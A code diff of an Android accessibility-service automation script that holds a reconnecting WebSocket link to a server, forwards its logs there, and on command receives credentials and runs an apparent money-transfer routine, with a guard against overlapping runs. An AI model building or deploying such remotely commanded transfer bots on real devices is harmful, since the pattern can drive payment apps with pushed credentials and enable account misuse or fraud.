@@ -6,6 +6,11 @@ const PHONE_NUMBER = "0123456789";    // Current device phone number
 //const POLL_INTERVAL = 3000;
 //const TRIGGER_URL = "http://" + SERVER_IP + ":3000/run-script?pn=" + PHONE_NUMBER;
 
+auto.waitFor();
+
+let transferRunning = false; // 控制转账线程，避免同时运行
+let ws;
+
 function log(msg) {
     try {
         http.postJson("http://" + SERVER_IP + ":3000/log/", {
@@ -17,6 +22,8 @@ function log(msg) {
     }
     console.log(msg);
 }
+
+auto.waitFor(); // waiting for accessibility service to be enabled
 
 // setInterval(() => {
 //     try {
@@ -50,44 +57,56 @@ function log(msg) {
 // }, POLL_INTERVAL);
 
 // 建立 WebSocket 连接
-let ws = new WebSocket("ws://" + SERVER_IP + ":3000/ws/" + PHONE_NUMBER + "/");
 
-ws.on("open", () => {
-    log("✅ WebSocket connected for device " + PHONE_NUMBER);
-});
+function connectWS() {
+    ws = new WebSocket("ws://" + SERVER_IP + ":3000/ws/" + PHONE_NUMBER + "/");
 
-ws.on("message", (msg) => {
-    log("📩 Received message: " + msg);
+    ws.on("open", () => log("✅ WebSocket connected for device " + PHONE_NUMBER));
 
-    let json;
-    try {
-        json = JSON.parse(msg);
-    } catch (err) {
-        log("❌ JSON parse error: " + err);
-        return;
-    }
+    ws.on("message", (msg) => {
+        log("📩 Received message: " + msg);
 
-    if (json.action === "start") {
-        let data = json.credentials || {};
-        threads.start(() => {
-            try {
-                run_transfer_process(data);
-            } catch (err) {
-                log("❌ Transfer process crashed: " + err);
-                close_app();
-            }
-        });
-    }
-});
+        if (transferRunning) {
+            log("⚠️ Transfer already running, message ignored");
+            return;
+        }
 
-ws.on("close", () => {
-    log("❌ WebSocket disconnected, will try reconnect...");
-    setTimeout(connectWS, 5000);
-});
+        let json;
+        try {
+            json = JSON.parse(msg);
+        } catch (err) {
+            log("❌ JSON parse error: " + err);
+            return;
+        }
 
-ws.on("error", (e) => {
-    log("❌ WebSocket error: " + e);
-});
+        if (json.action === "start") {
+            let data = json.credentials || {};
+            transferRunning = true;
+            threads.start(() => {
+                try {
+                    run_transfer_process(data);
+                } catch (err) {
+                    log("❌ Transfer process crashed: " + err);
+                } finally {
+                    transferRunning = false;
+                }
+            });
+        }
+    });
+
+    ws.on("close", () => {
+        log("❌ WebSocket disconnected, will try reconnect in 5s...");
+        setTimeout(connectWS, 5000);
+    });
+
+    ws.on("error", (e) => log("❌ WebSocket error: " + e));
+}
+
+connectWS();
+
+while (true) {
+    sleep(1000);
+}
 
 let error_status = "2";
 let message = "Transaction Success";
